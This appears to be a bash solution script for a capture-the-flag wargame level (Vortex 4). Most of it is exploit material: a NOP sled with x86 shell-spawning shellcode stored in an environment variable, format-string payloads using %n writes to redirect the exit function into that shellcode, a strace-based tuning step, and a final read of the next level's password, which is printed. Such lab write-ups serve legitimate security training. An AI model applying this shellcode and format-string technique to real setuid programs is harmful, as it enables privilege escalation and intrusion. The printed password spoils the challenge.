#!/bin/bash
mkdir /tmp/ballban_vortex4
cd /tmp/ballban_vortex4

nano vortex4_execv.c
gcc -m32 -o vortex4_execv vortex4_execv.c

# Create check_env.c and compile it
# It will check the address of environment variables
nano check_env.c
gcc -m32 check_env.c -o check_env

# Brute force the value let exit function address hit the shellcode
nano run.sh
chmod +x run.sh
./run.sh

# Set env
unset $(env | cut -d= -f1)  # cleanup envs
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 1000 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")
for i in {A..Z}; do
    export "${i}"="$(python3 -c "import sys; sys.stdout.buffer.write(b'AAAA\x08\xc0\x04\x08BBBB\x0a\xc0\x04\x08AAA%54802d.' + b'%p.' * 153 + b'%n.%9396d.%n.' + b'%p.' * 3)")"
done
export SHELL=/bin/bash
export LANG=C.UTF-8
export LC_CTYPE=UTF-8
export LC_TYPE=en_US.UTF-8
export LC_ALL=en_US.UTF-8
_=/usr/bin/env
# use strace to adjust the value of d
strace ./vortex4_execv

# Check EGG address
./check_env EGG # 0xffffdb49

# run without strace
./vortex4_execv
cat /etc/vortex_pass/vortex5
# password: heo3EbnS9

